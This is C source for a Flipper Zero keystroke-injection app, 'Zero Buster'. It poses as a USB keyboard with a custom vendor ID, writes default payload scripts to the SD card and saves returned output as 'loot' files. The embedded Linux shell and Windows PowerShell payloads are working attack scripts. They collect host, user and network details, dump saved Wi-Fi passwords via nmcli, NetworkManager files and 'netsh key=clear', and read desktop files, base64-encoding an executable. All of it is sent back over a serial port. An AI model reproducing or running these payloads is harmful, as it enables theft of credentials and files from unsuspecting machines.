#include "zero_buster_storage.h"

/* Save Custom HID config to MicroSD */
void save_custom_hid_config(Storage* storage, const FuriHalUsbHidConfig* cfg) {
    storage_simply_mkdir(storage, APP_DATA_DIR);
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, CUSTOM_HID_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        char buf[256];
        snprintf(
            buf,
            sizeof(buf),
            "# Custom HID configuration for Zero Buster\n"
            "VID=0x%04lX\n"
            "PID=0x%04lX\n"
            "MANUF=%s\n"
            "PRODUCT=%s\n",
            (unsigned long)cfg->vid,
            (unsigned long)cfg->pid,
            cfg->manuf,
            cfg->product);
        storage_file_write(f, buf, strlen(buf));
        storage_file_close(f);
    }
    storage_file_free(f);
}

/* Load or generate Custom HID config from /ext/zero_buster/custom_hid.txt */
void load_custom_hid_config(Storage* storage, FuriHalUsbHidConfig* cfg) {
    cfg->vid = 0x1337;
    cfg->pid = 0x0001;
    strncpy(cfg->manuf, "Custom Corp", sizeof(cfg->manuf) - 1);
    strncpy(cfg->product, "Custom Keyboard", sizeof(cfg->product) - 1);

    storage_simply_mkdir(storage, APP_DATA_DIR);

    FileInfo info;
    if(storage_common_stat(storage, CUSTOM_HID_FILE, &info) != FSE_OK) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, CUSTOM_HID_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* templ = "# Custom HID configuration for Zero Buster\n"
                                "# Modify VID and PID in hex, MANUF and PRODUCT as needed\n"
                                "VID=0x1337\n"
                                "PID=0x0001\n"
                                "MANUF=Custom Corp\n"
                                "PRODUCT=Custom Keyboard\n";
            storage_file_write(f, templ, strlen(templ));
            storage_file_close(f);
        }
        storage_file_free(f);
        return;
    }

    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, CUSTOM_HID_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[256];
        uint16_t bytes = storage_file_read(f, buf, sizeof(buf) - 1);
        if(bytes > 0) {
            buf[bytes] = '\0';
            char* p = buf;
            while(*p) {
                char* end = p;
                while(*end && *end != '\r' && *end != '\n')
                    end++;
                char next_char = *end;
                *end = '\0';

                char* line = p;
                while(*line == ' ' || *line == '\t')
                    line++;

                if(*line != '#' && *line != '\0') {
                    if(strncmp(line, "VID=", 4) == 0) {
                        cfg->vid = strtoul(line + 4, NULL, 16);
                    } else if(strncmp(line, "PID=", 4) == 0) {
                        cfg->pid = strtoul(line + 4, NULL, 16);
                    } else if(strncmp(line, "MANUF=", 6) == 0) {
                        strncpy(cfg->manuf, line + 6, sizeof(cfg->manuf) - 1);
                        cfg->manuf[sizeof(cfg->manuf) - 1] = '\0';
                    } else if(strncmp(line, "PRODUCT=", 8) == 0) {
                        strncpy(cfg->product, line + 8, sizeof(cfg->product) - 1);
                        cfg->product[sizeof(cfg->product) - 1] = '\0';
                    }
                }

                if(next_char == '\0') break;
                p = end + 1;
            }
        }
        storage_file_close(f);
    }
    storage_file_free(f);
}

/* Ensure default payloads exist on MicroSD on first run */
void ensure_default_payloads(Storage* storage) {
    // Directories are always ensured on every startup
    storage_simply_mkdir(storage, APP_DATA_DIR);
    storage_simply_mkdir(storage, PAYLOAD_DIR);
    storage_simply_mkdir(storage, LOOT_DIR);

    // If already initialized on a previous run, do not recreate or modify scripts
    FileInfo init_info;
    if(storage_common_stat(storage, INIT_MARKER_FILE, &init_info) == FSE_OK) {
        return;
    }

    // Remove legacy payloads if present
    storage_simply_remove(storage, PAYLOAD_DIR "/01_linux_recon.sh");
    storage_simply_remove(storage, PAYLOAD_DIR "/02_win_recon.ps1");
    storage_simply_remove(storage, PAYLOAD_DIR "/03_win_wifi_dump.ps1");
    storage_simply_remove(storage, PAYLOAD_DIR "/04_linux_wifi_dump.sh");
    storage_simply_remove(storage, PAYLOAD_DIR "/05_win_filedump.ps1");
    storage_simply_remove(storage, PAYLOAD_DIR "/06_linux_filedump.sh");

    // 01: Linux Exfiltracion (Recon)
    const char* default_01 = PAYLOAD_DIR "/01_linux_exfiltracion.sh";
    bool need_01_write = false;
    FileInfo info_01;
    if(storage_common_stat(storage, default_01, &info_01) != FSE_OK) {
        need_01_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_01, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "seq 1 60") == NULL) {
                    need_01_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_01_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_01, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "for i in $(seq 1 60); do dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1); [ -n \"$dev\" ] && break; sleep 0.2; done; if [ -n \"$dev\" ]; then sleep 0.5; (echo '=== ZERO BUSTER (LINUX RECON) ==='; echo \"Host: $(hostname)\"; echo \"User: $(whoami)\"; echo \"Kernel: $(uname -r)\"; echo \"Date: $(date)\"; echo '=== Network ==='; ip -4 -br a 2>/dev/null; echo '<<<EOF>>>') > \"$dev\"; fi\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // 02: Linux Wi-Fi
    const char* default_02 = PAYLOAD_DIR "/02_linux_wifi.sh";
    bool need_02_write = false;
    FileInfo info_02;
    if(storage_common_stat(storage, default_02, &info_02) != FSE_OK) {
        need_02_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_02, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "-w 1") == NULL) {
                    need_02_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_02_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_02, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "for i in $(seq 1 60); do dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1); [ -n \"$dev\" ] && break; sleep 0.2; done; if [ -n \"$dev\" ]; then sleep 0.5; (echo '=== ZERO BUSTER (LINUX WIFI) ==='; echo \"Host: $(hostname)\"; echo \"Date: $(date)\"; echo '=== Active Wi-Fi ==='; if command -v nmcli >/dev/null 2>&1; then nmcli -w 1 -s dev wifi show-password 2>/dev/null; fi; echo '=== Profiles ==='; found=0; if command -v nmcli >/dev/null 2>&1; then for s in $(nmcli -w 1 -t -f NAME,TYPE c show 2>/dev/null | grep ':802-11-wireless' | cut -d: -f1); do found=1; echo \"SSID: $s\"; k=$(nmcli -w 1 -s -g 802-11-wireless-security.psk c show \"$s\" 2>/dev/null); echo \"KEY : ${k:-(none)}\"; echo \"---\"; done; fi; if [ \"$found\" -eq 0 ] && [ -d /etc/NetworkManager/system-connections ]; then for f in /etc/NetworkManager/system-connections/*; do [ -f \"$f\" ] && { found=1; echo \"SSID: $(basename \"$f\" .nmconnection)\"; grep -i 'psk=' \"$f\" 2>/dev/null; echo \"---\"; }; done; fi; if [ \"$found\" -eq 0 ]; then echo \"[!] No Wi-Fi profiles found\"; fi; echo '=== Nearby ==='; if command -v nmcli >/dev/null 2>&1; then nmcli -w 1 -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null | head -n 10; fi; echo '<<<EOF>>>') > \"$dev\"; fi\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // 03: Linux Archivos (prueba.txt y prueba.exe)
    const char* default_03 = PAYLOAD_DIR "/03_linux_archivos.sh";
    bool need_03_write = false;
    FileInfo info_03;
    if(storage_common_stat(storage, default_03, &info_03) != FSE_OK) {
        need_03_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_03, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "seq 1 60") == NULL) {
                    need_03_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_03_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_03, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "for i in $(seq 1 60); do dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1); [ -n \"$dev\" ] && break; sleep 0.2; done; if [ -n \"$dev\" ]; then sleep 0.5; (d=\"$HOME/Desktop\"; [ ! -d \"$d\" ] && d=\"$HOME/Escritorio\"; [ ! -d \"$d\" ] && d=\"$HOME\"; echo '=== ZERO BUSTER (LINUX FILES) ==='; echo \"Host: $(hostname)\"; echo \"Desktop: $d\"; echo \"Date: $(date)\"; tf=\"$d/prueba.txt\"; [ ! -f \"$tf\" ] && [ -f \"$HOME/prueba.txt\" ] && tf=\"$HOME/prueba.txt\"; if [ -f \"$tf\" ]; then echo \"--- BEGIN prueba.txt ---\"; cat \"$tf\"; echo ''; echo '--- END prueba.txt ---'; else echo 'prueba.txt NOT FOUND'; fi; ef=\"$d/prueba.exe\"; [ ! -f \"$ef\" ] && [ -f \"$HOME/prueba.exe\" ] && ef=\"$HOME/prueba.exe\"; if [ -f \"$ef\" ]; then echo '--- BEGIN prueba.exe (BASE64) ---'; base64 \"$ef\" 2>/dev/null; echo '--- END prueba.exe (BASE64) ---'; else echo 'prueba.exe NOT FOUND'; fi; echo '<<<EOF>>>') > \"$dev\"; fi\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // 04: Windows Exfiltracion (Recon)
    const char* default_04 = PAYLOAD_DIR "/04_win_exfiltracion.ps1";
    bool need_04_write = false;
    FileInfo info_04;
    if(storage_common_stat(storage, default_04, &info_04) != FSE_OK) {
        need_04_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_04, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "-lt 60") == NULL) {
                    need_04_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_04_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_04, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "Add-Type -AssemblyName System.IO.Ports; $p=$null; for($i=0;$i -lt 60;$i++){ $a=[System.IO.Ports.SerialPort]::GetPortNames(); if($a.Count -gt 0){ $p=($a | Sort-Object { [int]($_ -replace '\\D') } | Select-Object -Last 1); if($a.Count -gt 1 -or $p -ne 'COM1'){ break } }; Start-Sleep -m 250 }; if($p){ Start-Sleep -m 500; $s=New-Object System.IO.Ports.SerialPort $p,115200; $s.DtrEnable=$true; $s.RtsEnable=$true; try{ $s.Open(); $s.WriteLine('=== ZERO BUSTER (WINDOWS RECON) ==='); $s.WriteLine('Host: '+$env:COMPUTERNAME); $s.WriteLine('User: '+$env:USERNAME); $s.WriteLine('OS: '+(Get-CimInstance Win32_OperatingSystem 2>$null).Caption); $s.WriteLine('Date: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')); $s.WriteLine('=== Network ==='); Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue|?{$_.InterfaceAlias -notmatch 'Loopback'}|%{$s.WriteLine($_.InterfaceAlias+': '+$_.IPAddress)} }catch{}finally{ try{ $s.WriteLine('<<<EOF>>>'); Start-Sleep -m 200; $s.Close() }catch{} } }; exit\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // 05: Windows Wi-Fi
    const char* default_05 = PAYLOAD_DIR "/05_win_wifi.ps1";
    bool need_05_write = false;
    FileInfo info_05;
    if(storage_common_stat(storage, default_05, &info_05) != FSE_OK) {
        need_05_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_05, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "-lt 60") == NULL) {
                    need_05_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_05_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_05, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "Add-Type -AssemblyName System.IO.Ports; $p=$null; for($i=0;$i -lt 60;$i++){ $a=[System.IO.Ports.SerialPort]::GetPortNames(); if($a.Count -gt 0){ $p=($a | Sort-Object { [int]($_ -replace '\\D') } | Select-Object -Last 1); if($a.Count -gt 1 -or $p -ne 'COM1'){ break } }; Start-Sleep -m 250 }; if($p){ Start-Sleep -m 500; $s=New-Object System.IO.Ports.SerialPort $p,115200; $s.DtrEnable=$true; $s.RtsEnable=$true; try{ $s.Open(); $s.WriteLine('=== ZERO BUSTER (WINDOWS WIFI) ==='); $s.WriteLine('Host: '+$env:COMPUTERNAME); $s.WriteLine('Date: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')); $raw=netsh wlan show profiles 2>$null; $ps=@(); if($raw){ $raw|Select-String ':\\s+(.+)$'|%{ $v=$_.Matches.Groups[1].Value.Trim(); if($v -and $v -notmatch '<(ninguno|none)>'){ $ps+=$v } } }; if($ps.Count -eq 0){ $s.WriteLine('[!] No Wi-Fi profiles found or WLAN inactive.') }else{ foreach($pn in $ps){ $s.WriteLine('SSID: '+$pn); $d=netsh wlan show profile name=\"$pn\" key=clear 2>$null; $k=($d|Select-String '(?i)(Key Content|Contenido de la clave)\\s*:\\s*(.+)$'|Select-Object -First 1); if($k){ $s.WriteLine('KEY : '+$k.Matches.Groups[2].Value.Trim()) }else{ $s.WriteLine('KEY : (open / none)') }; $s.WriteLine('---') } } }catch{}finally{ try{ $s.WriteLine('<<<EOF>>>'); Start-Sleep -m 200; $s.Close() }catch{} } }; exit\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // 06: Windows Archivos (prueba.txt y prueba.exe)
    const char* default_06 = PAYLOAD_DIR "/06_win_archivos.ps1";
    bool need_06_write = false;
    FileInfo info_06;
    if(storage_common_stat(storage, default_06, &info_06) != FSE_OK) {
        need_06_write = true;
    } else {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_06, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char check_buf[128];
            uint16_t r = storage_file_read(f, check_buf, sizeof(check_buf) - 1);
            if(r > 0) {
                check_buf[r] = '\0';
                if(strstr(check_buf, "-lt 60") == NULL) {
                    need_06_write = true;
                }
            }
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    if(need_06_write) {
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, default_06, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* content =
                "Add-Type -AssemblyName System.IO.Ports; $p=$null; for($i=0;$i -lt 60;$i++){ $a=[System.IO.Ports.SerialPort]::GetPortNames(); if($a.Count -gt 0){ $p=($a | Sort-Object { [int]($_ -replace '\\D') } | Select-Object -Last 1); if($a.Count -gt 1 -or $p -ne 'COM1'){ break } }; Start-Sleep -m 250 }; if($p){ Start-Sleep -m 500; $s=New-Object System.IO.Ports.SerialPort $p,115200; $s.DtrEnable=$true; $s.RtsEnable=$true; try{ $s.Open(); $dirs=@([Environment]::GetFolderPath('Desktop'),[Environment]::GetFolderPath('DesktopDirectory'),\"$env:USERPROFILE\\Desktop\",\"$env:USERPROFILE\\OneDrive\\Desktop\",\"$env:USERPROFILE\\Escritorio\",\"$env:USERPROFILE\\OneDrive\\Escritorio\")|?{$_ -and (Test-Path $_)}|Select-Object -Unique; $tf=$null; foreach($d in $dirs){ $t=Join-Path $d 'prueba.txt'; if(Test-Path $t){ $tf=$t; break } }; $ef=$null; foreach($d in $dirs){ $e=Join-Path $d 'prueba.exe'; if(Test-Path $e){ $ef=$e; break } }; $s.WriteLine('=== ZERO BUSTER (WINDOWS FILES) ==='); $s.WriteLine('Host: '+$env:COMPUTERNAME); if($tf){ $s.WriteLine('[+] File: '+$tf); $s.WriteLine('--- BEGIN prueba.txt ---'); gc $tf|%{$s.WriteLine($_)}; $s.WriteLine('--- END prueba.txt ---') }else{ $s.WriteLine('prueba.txt NOT FOUND (Checked: '+($dirs -join '; ')+')') }; if($ef){ $s.WriteLine('[+] File: '+$ef); $s.WriteLine('--- BEGIN prueba.exe (BASE64) ---'); [Convert]::ToBase64String([IO.File]::ReadAllBytes($ef),[Base64FormattingOptions]::InsertLineBreaks) -split \"`n\"|%{$s.WriteLine($_.TrimEnd(\"`r\"))}; $s.WriteLine('--- END prueba.exe (BASE64) ---') }else{ $s.WriteLine('prueba.exe NOT FOUND (Checked: '+($dirs -join '; ')+')') } }catch{}finally{ try{ $s.WriteLine('<<<EOF>>>'); Start-Sleep -m 200; $s.Close() }catch{} } }; exit\n";
            storage_file_write(f, content, strlen(content));
            storage_file_close(f);
        }
        storage_file_free(f);
    }

    // Create marker file so default payloads are only written once on first launch
    File* marker = storage_file_alloc(storage);
    if(storage_file_open(marker, INIT_MARKER_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        const char* msg = "# Zero Buster initialized marker\n";
        storage_file_write(marker, msg, strlen(msg));
        storage_file_close(marker);
    }
    storage_file_free(marker);
}

/* Scan /ext/zero_buster/payloads for available files */
void scan_payloads(ZeroBusterApp* app) {
    ensure_default_payloads(app->storage);

    app->payloads.count = 0;
    app->payloads.selected_index = 0;

    File* dir = storage_file_alloc(app->storage);
    if(storage_dir_open(dir, PAYLOAD_DIR)) {
        FileInfo info;
        char name[MAX_PAYLOAD_NAME_LEN];
        while(storage_dir_read(dir, &info, name, sizeof(name))) {
            if(name[0] == '.') continue;
            if(!file_info_is_dir(&info)) {
                strncpy(app->payloads.names[app->payloads.count], name, MAX_PAYLOAD_NAME_LEN - 1);
                app->payloads.names[app->payloads.count][MAX_PAYLOAD_NAME_LEN - 1] = '\0';
                app->payloads.count++;
                if(app->payloads.count >= MAX_PAYLOADS) break;
            }
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
}

/* Helper to generate incremental loot filenames */
void get_next_loot_filepath(Storage* storage, char* out_path, size_t max_len) {
    storage_simply_mkdir(storage, APP_DATA_DIR);
    storage_simply_mkdir(storage, LOOT_DIR);
    uint32_t index = 1;
    while(index < 1000) {
        snprintf(out_path, max_len, "%s/loot_%03lu.txt", LOOT_DIR, (unsigned long)index);
        FileInfo info;
        if(storage_common_stat(storage, out_path, &info) != FSE_OK) {
            break;
        }
        index++;
    }
}
